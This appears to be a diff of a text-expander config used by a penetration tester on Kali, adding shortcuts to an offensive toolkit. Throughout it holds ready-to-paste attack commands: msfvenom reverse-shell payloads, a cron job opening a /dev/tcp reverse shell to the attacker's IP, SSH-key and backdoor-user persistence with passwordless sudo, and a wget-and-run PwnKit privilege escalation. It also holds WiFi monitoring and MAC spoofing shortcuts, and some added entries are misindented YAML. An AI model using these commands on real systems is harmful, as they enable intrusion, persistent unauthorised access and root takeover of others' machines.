@@ -15,10 +15,21 @@ global_vars:
     params:
       cmd: "cat /home/kali/.ssh/id_rsa.pub"
 
+    # sudo apt install xclip -y
+  - name: "clipboard"
+    type: "shell"
+    params:
+      cmd: "xclip -o"
+
+
+
 matches:
 # QOL
   - trigger: ":ip"
     replace: "{{IP}}"
+
+  - trigger: ":clipboard"
+    replace: "{{clipboard}}"
                   
 # SETUP AND NMAP              
   - trigger: ":setup"                  
@@ -31,6 +42,7 @@ matches:
       msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
       msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
+      msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh
       cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
@@ -63,7 +75,7 @@ matches:
 
   - trigger: ":pyserver"
     replace: "python3 -m http.server"
-  
+
   - trigger: ":phpserver"
     replace: "php -S 0.0.0.0:"
                                                                                 
@@ -72,9 +84,10 @@ matches:
                                                                                 
   - trigger: ":nc"
     replace: nc -nvlp 443
+
 # ENUMERATION
   - trigger: ":nmap"
-    replace: sudo nmap -sC -sV -v -p- -o nmap --min-rate 
+    replace: sudo nmap -sC -sV -v -p- -o nmap {{clipboard}} --min-rate 
 
   - trigger: ":lping"
     replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
@@ -83,7 +96,19 @@ matches:
     replace: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 
   - trigger: ":dirsearch"
-    replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u "
+    replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u {{clipboard}}"
+
+   - trigger: ":dirsearch2"
+    replace: "dirsearch -w /usr/share/wordlists/dirb/common.txt -t 64 -e php,txt,html -f -u {{clipboard}}"   
+
+  - trigger: ":dirsearch3"
+    replace: "dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 64 -e php,txt,html -f -u {{clipboard}}"
+
+   - trigger: ":findext"
+    replace: "ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://{{clipboard}}/blog/indexFUZZ"
+
+  - trigger: ":xfreerdp"
+    replace: "xfreerdp /dynamic-resolution /cert-ignore /compression /auto-reconnect /v:{{clipboard}} /u:user /p:pass "
 
 # REVERSE SHELLS                                                                
   # LINUX                                                                       
@@ -114,11 +139,16 @@ matches:
       stty rows 60 
       stty columns 150
       export TERM=screen
-    
+      
+   - trigger: ":userpersist"
+    replace: |
+      "sudo useradd -m backup && echo "backup:password" | sudo chpasswd && echo 'backup ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"   
+      
   - trigger: ":sshpersist"
     replace: |
       mkdir -p ~/.ssh
       echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
+      
   - trigger: ":cronpersist"
     replace: (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'") | crontab -
   
@@ -145,3 +175,25 @@ matches:
   - trigger: ":root"
     replace: |
       wget http://{{IP}}/PwnKit && chmod +x PwnKit && ./PwnKit
+
+# DEFENSE
+  - trigger: ":kill"
+    replace: kill -9 
+
+  - trigger: ":pkill"
+    replace: pkill -9 -t pts/
+
+# WIFI
+
+  - trigger: ":airup"
+    replace: sudo airmon-ng start wlan0
+
+  - trigger: ":airodump"
+    replace: sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
+
+  - trigger: ":hostname"
+    replace: hostnamectl set-hostname
+
+  - trigger: ":spoofmac"
+    replace: macchanger -A wlan0mon
+    
